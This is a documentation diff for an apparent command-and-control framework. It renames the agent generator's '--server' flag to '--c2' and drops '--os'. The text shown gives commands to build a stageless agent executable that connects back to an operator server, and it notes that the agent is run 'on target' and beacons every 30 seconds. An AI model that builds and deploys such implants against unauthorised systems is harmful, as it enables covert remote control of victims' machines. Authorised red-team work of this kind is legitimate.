@@ -71,9 +71,8 @@ Build a Windows agent that connects back to your server:
 
 ```bash
 go run ./cmd/generate stageless \
-  --server http://YOUR_SERVER_IP:8080 \
+  --c2 http://YOUR_SERVER_IP:8080 \
   --key changeme \
-  --os windows \
   --arch amd64 \
   --output ./output/agent.exe
 ```
@@ -87,14 +86,13 @@ go run ./cmd/generate stageless \
     Build : 12.3s
 ```
 
-For a quick Linux test on the same machine:
+For a quick local test on the same machine:
 ```bash
 go run ./cmd/generate stageless \
-  --server http://127.0.0.1:8080 \
+  --c2 http://127.0.0.1:8080 \
   --key changeme \
-  --os linux \
   --arch amd64 \
-  --output ./output/agent
+  --output ./output/agent.exe
 ```
 
 ---
@@ -154,7 +152,7 @@ Type `help` to see all available commands grouped by category.
 |------|---------|-------|
 | Start server | `ENCRYPTION_KEY=key go run ./cmd/server` | Key must match agent |
 | Build CLI | `go build -o bin/taburtuai ./cmd/operator` | One-time |
-| Generate agent | `go run ./cmd/generate stageless ...` | Set --server and --key |
+| Generate agent | `go run ./cmd/generate stageless ...` | Set --c2 and --key |
 | Run agent | Execute on target | Beacons every 30s |
 | Connect CLI | `./bin/taburtuai console` | Interactive console |
 
